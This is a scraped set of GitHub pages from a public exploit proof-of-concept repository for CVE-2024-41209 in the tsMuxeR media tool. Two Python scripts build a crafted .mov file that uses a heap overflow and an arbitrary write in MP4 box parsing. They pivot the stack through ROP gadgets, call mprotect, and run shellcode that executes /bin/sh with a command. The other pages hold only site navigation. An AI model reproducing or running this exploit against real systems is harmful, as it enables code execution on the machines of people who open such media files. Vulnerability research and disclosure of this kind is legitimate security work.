  0](/RICSecLab/exploit-poc-public/projects)
* [Security](/RICSecLab/exploit-poc-public/security)
* [Insights](/RICSecLab/exploit-poc-public/pulse)

Additional navigation options

* [Code](/RICSecLab/exploit-poc-public)
* [Issues](/RICSecLab/exploit-poc-public/issues)
* [Pull requests](/RICSecLab/exploit-poc-public/pulls)
* [Actions](/RICSecLab/exploit-poc-public/actions)
* [Projects](/RICSecLab/exploit-poc-public/projects)
* [Security](/RICSecLab/exploit-poc-public/security)
* [Insights](/RICSecLab/exploit-poc-public/pulse)

## Files

 main
## Breadcrumbs

1. [exploit-poc-public](/RICSecLab/exploit-poc-public/tree/main)
2. /[CVE-2024-41209](/RICSecLab/exploit-poc-public/tree/main/CVE-2024-41209)
/
# exploit\_final\_poc.py

Copy path Blame  Blame
## Latest commit

## History

[History](/RICSecLab/exploit-poc-public/commits/main/CVE-2024-41209/exploit_final_poc.py)191 lines (164 loc) · 5.68 KB main
## Breadcrumbs

1. [exploit-poc-public](/RICSecLab/exploit-poc-public/tree/main)
2. /[CVE-2024-41209](/RICSecLab/exploit-poc-public/tree/main/CVE-2024-41209)
/
# exploit\_final\_poc.py

Top
## File metadata and controls

* Code
* Blame

191 lines (164 loc) · 5.68 KB[Raw](https://github.com/RICSecLab/exploit-poc-public/raw/refs/heads/main/CVE-2024-41209/exploit_final_poc.py)123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191from ptrlib import \*
addr\_arg0 = 0x900ed0 - 0x100addr\_arg1 = 0x900ed0 - 0x100 + 0x10addr\_arg2 = 0x900ed0 - 0x100 + 0x20addr\_args = 0x900ed0 - 0x100 - 0x20
def craft\_write(addr, val): return [ 0xb990c031, # xor eax, eax # or al, XX; shl eax, 8 # 0xb990000c | (((addr >> 24) & 0xff) << 8), 0xb908e0c1, 0xb990000c | (((addr >> 16) & 0xff) << 8), 0xb908e0c1, 0xb990000c | (((addr >> 8) & 0xff) << 8), 0xb908e0c1, 0xb990000c | (((addr >> 0) & 0xff) << 8), # mov bl, XX 0xb99000b3 | (val << 8), # mov [rax], bl 0xb9901888 ]
def craft\_string(addr, s): out = [] for i, c in enumerate(s): out += craft\_write(addr + i, c) return out
shellcode = []shellcode += craft\_string(addr\_arg0, b'/bin/sh\0')shellcode += craft\_string(addr\_arg1, b'-c\0')shellcode += craft\_string(addr\_arg2, b'ls -lha; id; date\0')for i in range(3): shellcode += craft\_write(addr\_args+i, (addr\_arg0 >> (i\*8)) & 0xff)for i in range(3): shellcode += craft\_write(addr\_args+8+i, (addr\_arg1 >> (i\*8)) & 0xff)for i in range(3): shellcode += craft\_write(addr\_args+0x10+i, (addr\_arg2 >> (i\*8)) & 0xff)addr = addr\_args+0x18shellcode += [ 0xb990c031, # xor eax, eax # or al, XX; shl eax, 8 0xb990000c | (((addr >> 16) & 0xff) << 8), 0xb908e0c1, 0xb990000c | (((addr >> 8) & 0xff) << 8), 0xb908e0c1, 0xb990000c | (((addr >> 0) & 0xff) << 8), # xor ebx, ebx 0xb990db31, # mov [rax], rbx 0xb9188948]
# Set rsiaddr = addr\_argsshellcode += [ 0xb990c031, # xor eax, eax # or al, XX; shl eax, 8 0xb990000c | (((addr >> 16) & 0xff) << 8), 0xb908e0c1, 0xb990000c | (((addr >> 8) & 0xff) << 8), 0xb908e0c1, 0xb990000c | (((addr >> 0) & 0xff) << 8), # mov esi, eax 0xb990c689,]
# Set rdiaddr = addr\_arg0shellcode += [ 0xb990c031, # xor eax, eax # or al, XX; shl eax, 8 0xb990000c | (((addr >> 16) & 0xff) << 8), 0xb908e0c1, 0xb990000c | (((addr >> 8) & 0xff) << 8), 0xb908e0c1, 0xb990000c | (((addr >> 0) & 0xff) << 8), # mov edi, eax 0xb990c789,]
shellcode += [ 'xor edx, edx', 'xor eax, eax', 'mov al, 59', 'syscall',]
elf = ELF("./tsMuxeR")
# ファイルヘッダftyp = b''ftyp += b'iso5' # major\_brandftyp += p32(1, 'big') # minor\_version
# tfhdのためにnum\_tracksをインクリメントするtrak = b''
# tfhdのためにtrexを追加するtrex1 = b''trex1 += b'\x00' # versiontrex1 += b'\x00\x00\x00' # flagstrex1 += p32(1, 'big') # track\_idtrex1 += p32(1, 'big') # stsd\_idtrex1 += p32(0, 'big') # durationtrex1 += p32(0, 'big') # sizetrex1 += p32(0, 'big') # flags
# trunのためにfrag->track\_idを設定するtfhd1 = b''tfhd1 += b'\x00' # versiontfhd1 += b'\x00\x00\x00' # flagstfhd1 += p32(1, 'big') # track\_id
trun1\_entries = [0] \* (0x1f0 // 0x10)trun1 = b''trun1 += b'\x00' # versiontrun1 += b'\x00\x08\x00' # flags (set for ctts\_data)trun1 += p32(len(trun1\_entries), 'big') # entriestrun1 += flat(trun1\_entries, map=lambda x: p32(x, 'big'))
ctts1 = b''ctts1 += b'\x00' # versionctts1 += b'\x00\x00\x00' # flagsctts1 += p32(0, 'big') # entries (resize)
# 本質パートaddr\_write = 0x901e60 - len(shellcode) \* 8trun2\_entries = [0xdeadbeef, 0x191] + [0] \* 22 + [addr\_write]trun2 = b''trun2 += b'\x00' # versiontrun2 += b'\x00\x08\x00' # flags (set for ctts\_data)trun2 += p32(len(trun2\_entries), 'big') # entriestrun2 += flat(trun2\_entries, map=lambda x: p32(x, 'big'))
# vectorを作るためのcttsctts2 = b''ctts2 += b'\x00' # versionctts2 += b'\x00\x00\x00' # flagsctts2 += p32(1, 'big') # entries (resize)ctts2 += p32(0, 'big') + p32(0, 'big') # count / duration
# 壊れたvectorに書き込むためのAAW# 0x007b0851: mov esp, ebp; pop rbx; pop rbp; mov rax, r12; pop r12; ret;rop\_pivot = next(elf.gadget( "mov esp, ebp; pop rbx; pop rbp; mov rax, r12; pop r12; ret"))
def convert(b): assert len(b) < 4 return u32(b + b'\x90'\*(3 - len(b)) + b'\xb9')
ctts3\_entries = []for i in range(0, len(shellcode), 2): ctts3\_entries.append([ shellcode[i] if isinstance(shellcode[i], int) else convert(assemble(shellcode[i])), shellcode[i+1] if isinstance(shellcode[i+1], int) else convert(assemble(shellcode[i+1])) ])
ctts3\_entries += [ [0xdead0000, 0xcafe0000], # rbx / rbp [0xdead0012, next(elf.gadget('pop rdi; ret'))], # r12 [addr\_write & ~0xfff, next(elf.gadget('pop rsi; ret'))], [0x4000, next(elf.gadget('pop rdx; ret'))], [0b111, next(elf.gadget('pop rax; ret'))], [syscall.x64.mprotect, next(elf.gadget('syscall; pop rbp; ret'))], [rop\_pivot, addr\_write],]
ctts3 = b''ctts3 += b'\x00' # versionctts3 += b'\x00\x00\x00' # flagsctts3 += p32(len(ctts3\_entries), 'big') # entries (resize)ctts3 += flat(ctts3\_entries, map=lambda p: p32(p[0], 'big') + p32(p[1], 'big'))
moov = b''moov += p32(8 + len(trak), 'big') + b'trak' + trakmoov += p32(8 + len(trex1), 'big') + b'trex' + trex1moov += p32(8 + len(tfhd1), 'big') + b'tfhd' + tfhd1moov += p32(8 + len(trun1), 'big') + b'trun' + trun1moov += p32(8 + len(ctts1), 'big') + b'ctts' + ctts1moov += p32(8 + len(trak), 'big') + b'trak' + trak # MovStreamContextを確保moov += p32(8 + len(ctts2), 'big') + b'ctts' + ctts2 # vectorをセットmoov += p32(8 + len(trun2), 'big') + b'trun' + trun2 # heap overflowmoov += p32(8 + len(ctts3), 'big') + b'ctts' + ctts3 # AAW
payload = b""payload += p32(8 + len(ftyp), 'big') + b'ftyp' + ftyppayload += p32(8 + len(moov), 'big') + b"moov" + moovpayload += p32(8, 'big') + b'cmov' # throw
with open("exploit.mov", "wb") as f: f.write(payload)
#sock = Process(["./tsMuxeR", "exploit.mov"])#sock.sh()

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_1837d65e_20250115_114657.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FRICSecLab%2Fexploit-poc-public%2Fblob%2Fmain%2FCVE-2024-41209%2Fexploit_stack_pivot.py)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FRICSecLab%2Fexploit-poc-public%2Fblob%2Fmain%2FCVE-2024-41209%2Fexploit_stack_pivot.py)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fblob%2Fshow&source=header-repo&source_repo=RICSecLab%2Fexploit-poc-public)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[RICSecLab](/RICSecLab)
/
**[exploit-poc-public](/RICSecLab/exploit-poc-public)**
Public

* [Notifications](/login?return_to=%2FRICSecLab%2Fexploit-poc-public) You must be signed in to change notification settings
* [Fork
  4](/login?return_to=%2FRICSecLab%2Fexploit-poc-public)
* [Star
   20](/login?return_to=%2FRICSecLab%2Fexploit-poc-public)

* [Code](/RICSecLab/exploit-poc-public)
* [Issues
  0](/RICSecLab/exploit-poc-public/issues)
* [Pull requests
  0](/RICSecLab/exploit-poc-public/pulls)
* [Actions](/RICSecLab/exploit-poc-public/actions)
* [Projects
  0](/RICSecLab/exploit-poc-public/projects)
* [Security](/RICSecLab/exploit-poc-public/security)
* [Insights](/RICSecLab/exploit-poc-public/pulse)

Additional navigation options

* [Code](/RICSecLab/exploit-poc-public)
* [Issues](/RICSecLab/exploit-poc-public/issues)
* [Pull requests](/RICSecLab/exploit-poc-public/pulls)
* [Actions](/RICSecLab/exploit-poc-public/actions)
* [Projects](/RICSecLab/exploit-poc-public/projects)
* [Security](/RICSecLab/exploit-poc-public/security)
* [Insights](/RICSecLab/exploit-poc-public/pulse)

## Files

 main
## Breadcrumbs

1. [exploit-poc-public](/RICSecLab/exploit-poc-public/tree/main)
2. /[CVE-2024-41209](/RICSecLab/exploit-poc-public/tree/main/CVE-2024-41209)
/
# exploit\_stack\_pivot.py

Copy path Blame  Blame
## Latest commit

## History

[History](/RICSecLab/exploit-poc-public/commits/main/CVE-2024-41209/exploit_stack_pivot.py)100 lines (85 loc) · 3.26 KB main
## Breadcrumbs

1. [exploit-poc-public](/RICSecLab/exploit-poc-public/tree/main)
2. /[CVE-2024-41209](/RICSecLab/exploit-poc-public/tree/main/CVE-2024-41209)
/
# exploit\_stack\_pivot.py

Top
## File metadata and controls

* Code
* Blame

100 lines (85 loc) · 3.26 KB[Raw](https://github.com/RICSecLab/exploit-poc-public/raw/refs/heads/main/CVE-2024-41209/exploit_stack_pivot.py)123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100#!/usr/bin/env python3from ptrlib import \*
elf = ELF('./tsMuxeR')# ファイルヘッダftyp = b''ftyp += b'iso5' # major\_brandftyp += p32(1, 'big') # minor\_version
# tfhdのためにnum\_tracksをインクリメントするtrak = b''
# tfhdのためにtrexを追加するtrex1 = b''trex1 += b'\x00' # versiontrex1 += b'\x00\x00\x00' # flagstrex1 += p32(1, 'big') # track\_idtrex1 += p32(1, 'big') # stsd\_idtrex1 += p32(0, 'big') # durationtrex1 += p32(0, 'big') # sizetrex1 += p32(0, 'big') # flags
# trunのためにfrag->track\_idを設定するtfhd1 = b''tfhd1 += b'\x00' # versiontfhd1 += b'\x00\x00\x00' # flagstfhd1 += p32(1, 'big') # track\_id
trun1\_entries = [0] \* (0x1f0 // 0x10)trun1 = b''trun1 += b'\x00' # versiontrun1 += b'\x00\x08\x00' # flags (set for ctts\_data)trun1 += p32(len(trun1\_entries), 'big') # entriestrun1 += flat(trun1\_entries, map=lambda x: p32(x, 'big'))
ctts1 = b''ctts1 += b'\x00' # versionctts1 += b'\x00\x00\x00' # flagsctts1 += p32(0, 'big') # entries (resize)
# 本質パートtrun2\_entries = [0xdeadbeef, 0x191] + [u64(b"trun2")] \* 22trun2\_entries += [elf.symbol("\_IO\_file\_jumps")] # 書き込み先trun2 = b''trun2 += b'\x00' # versiontrun2 += b'\x00\x08\x00' # flags (set for ctts\_data)trun2 += p32(len(trun2\_entries), 'big') # entriestrun2 += flat(trun2\_entries, map=lambda x: p32(x, 'big'))
# vectorを作るためのcttsctts2 = b''ctts2 += b'\x00' # versionctts2 += b'\x00\x00\x00' # flagsctts2 += p32(1, 'big') # entries (resize)ctts2 += p32(0, 'big') + p32(0, 'big') # count / duration
# 壊れたvectorに書き込むためのAAW# 0x007b0861: mov esp, ebp; pop rbx; pop rbp; mov rax, r12; pop r12; ret;rop\_pivot = next(elf.gadget( "mov esp, ebp; pop rbx; pop rbp; mov rax, r12; pop r12; ret"))
addr\_write = elf.symbol("\_IO\_file\_jumps") - 0x20ctts3\_entries = [ [0xdead0000, 0xcafe0000], # rbx / rbp [0xdead0012, next(elf.gadget('pop rdi; ret'))], # r12 [addr\_write & ~0xfff, next(elf.gadget('pop rsi; ret'))], [0x4000, next(elf.gadget('pop rdx; ret'))], [0b111, next(elf.gadget('pop rax; ret'))], [syscall.x64.mprotect, next(elf.gadget('syscall; pop rbp; ret'))], [rop\_pivot, addr\_write],]ctts3 = b''ctts3 += b'\x00' # versionctts3 += b'\x00\x00\x00' # flagsctts3 += p32(len(ctts3\_entries), 'big') # entries (resize)ctts3 += flat(ctts3\_entries, map=lambda p: p32(p[0], 'big') + p32(p[1], 'big'))
moov = b''moov += p32(8 + len(trak), 'big') + b'trak' + trakmoov += p32(8 + len(trex1), 'big') + b'trex' + trex1moov += p32(8 + len(tfhd1), 'big') + b'tfhd' + tfhd1moov += p32(8 + len(trun1), 'big') + b'trun' + trun1moov += p32(8 + len(ctts1), 'big') + b'ctts' + ctts1moov += p32(8 + len(trak), 'big') + b'trak' + trak # MovStreamContextを確保moov += p32(8 + len(ctts2), 'big') + b'ctts' + ctts2 # vectorをセットmoov += p32(8 + len(trun2), 'big') + b'trun' + trun2 # heap overflowmoov += p32(8 + len(ctts3), 'big') + b'ctts' + ctts3 # AAW
payload = b""payload += p32(8 + len(ftyp), 'big') + b'ftyp' + ftyppayload += p32(8 + len(moov), 'big') + b"moov" + moovpayload += p32(8, 'big') + b'cmov' # throw
with open("exploit.mov", "wb") as f: f.write(payload)
#sock = Process(["./tsMuxeR", "exploit.mov"])#sock.sh()

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_9acad7da_20250115_114659.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FRICSecLab%2Fexploit-poc-public%2Fblob%2Fmain%2FCVE-2024-41209%2Fexploit_rip.py)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FRICSecLab%2Fexploit-poc-public%2Fblob%2Fmain%2FCVE-2024-41209%2Fexploit_rip.py)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fblob%2Fshow&source=header-repo&source_repo=RICSecLab%2Fexploit-poc-public)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[RICSecLab](/RICSecLab)
/
**[exploit-poc-public](/RICSecLab/exploit-poc-public)**
Public

* [Notifications](/login?return_to=%2FRICSecLab%2Fexploit-poc-public) You must be signed in to change notification settings
* [Fork
  4](/login?return_to=%2FRICSecLab%2Fexploit-poc-public)
* [Star
   20](/login?return_to=%2FRICSecLab%2Fexploit-poc-public)

* [Code](/RICSecLab/exploit-poc-public)
* [Issues
  0](/RICSecLab/exploit-poc-public/issues)
* [Pull requests
  0](/RICSecLab/exploit-poc-public/pulls)
* [Actions](/RICSecLab/exploit-poc-public/actions)
* [Projects
  0](/RICSecLab/exploit-poc-public/projects)
* [Security](/RICSecLab/exploit-poc-public/security)
* [Insights](/RICSecLab/exploit-poc-public/pulse)

Additional navigation options

* [Code](/RICSecLab/exploit-poc-public)
* [Issues](/RICSecLab/exploit-poc-public/issues)
* [Pull requests](/RICSecLab/exploit-poc-public/pulls)
* [Actions](/RICSecLab/exploit-poc-public/actions)
* [Projects](/RICSecLab/exploit-poc-public/projects)
* [Security](/RICSecLab/exploit-poc-public/security)
* [Insights](/RICSecLab/exploit-poc-public/pulse)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_59074346_20250115_114659.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FRICSecLab%2Fexploit-poc-public%2Fblob%2Fmain%2FCVE-2024-41209%2Fexploit_min_poc.py)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FRICSecLab%2Fexploit-poc-public%2Fblob%2Fmain%2FCVE-2024-41209%2Fexploit_min_poc.py)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fblob%2Fshow&source=header-repo&source_repo=RICSecLab%2Fexploit-poc-public)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[RICSecLab](/RICSecLab)
/
**[exploit-poc-public](/RICSecLab/exploit-poc-public)**
Public

* [Notifications](/login?return_to=%2FRICSecLab%2Fexploit-poc-public) You must be signed in to change notification settings
* [Fork
  4](/login?return_to=%2FRICSecLab%2Fexploit-poc-public)
* [Star
   20](/login?return_to=%2FRICSecLab%2Fexploit-poc-public)

* [Code](/RICSecLab/exploit-poc-public)
* [Issues
  0](/RICSecLab/exploit-poc-public/issues)
* [Pull requests
  0](/RICSecLab/exploit-poc-public/pulls)
* [Actions](/RICSecLab/exploit-poc-public/actions)
* [Projects
  0](/RICSecLab/exploit-poc-public/projects)
* [Security](/RICSecLab/exploit-poc-public/security)
* [Insights](/RICSecLab/exploit-poc-public/pulse)

Additional navigation options

* [Code](/RICSecLab/exploit-poc-public)
* [Issues](/RICSecLab/exploit-poc-public/issues)
* [Pull requests](/RICSecLab/exploit-poc-public/pulls)
* [Actions](/RICSecLab/exploit-poc-public/actions)
* [Projects](/RICSecLab/exploit-poc-public/projects)
* [Security](/RICSecLab/exploit-poc-public/security)
* [Insights](/RICSecLab/exploit-poc-public/pulse)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_de533c67_20250115_114652.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FRICSecLab%2Fexploit-poc-public%2Fblob%2Fmain%2FCVE-2024-41209%2Fexploit_shellcode.py)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
